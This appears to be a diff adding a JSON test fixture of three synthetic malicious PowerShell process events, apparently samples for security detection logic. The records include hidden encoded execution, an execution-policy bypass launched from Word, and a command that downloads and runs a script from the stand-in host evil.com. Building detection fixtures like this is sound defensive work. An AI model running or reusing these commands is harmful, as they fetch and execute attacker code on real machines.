@@ -1,0 +1,29 @@
+[
+  {
+    "id": "sp_mal_001",
+    "TimeGenerated": "2024-01-15T10:00:00Z",
+    "DeviceName": "WORKSTATION-01",
+    "AccountName": "jdoe",
+    "FileName": "powershell.exe",
+    "ProcessCommandLine": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+    "InitiatingProcessFileName": "explorer.exe"
+  },
+  {
+    "id": "sp_mal_002",
+    "TimeGenerated": "2024-01-15T10:05:00Z",
+    "DeviceName": "WORKSTATION-02",
+    "AccountName": "jsmith",
+    "FileName": "powershell.exe",
+    "ProcessCommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+    "InitiatingProcessFileName": "cmd.exe"
+  },
+  {
+    "id": "sp_mal_003",
+    "TimeGenerated": "2024-01-15T10:10:00Z",
+    "DeviceName": "SERVER-01",
+    "AccountName": "administrator",
+    "FileName": "powershell.exe",
+    "ProcessCommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\malware.ps1",
+    "InitiatingProcessFileName": "winword.exe"
+  }
+]
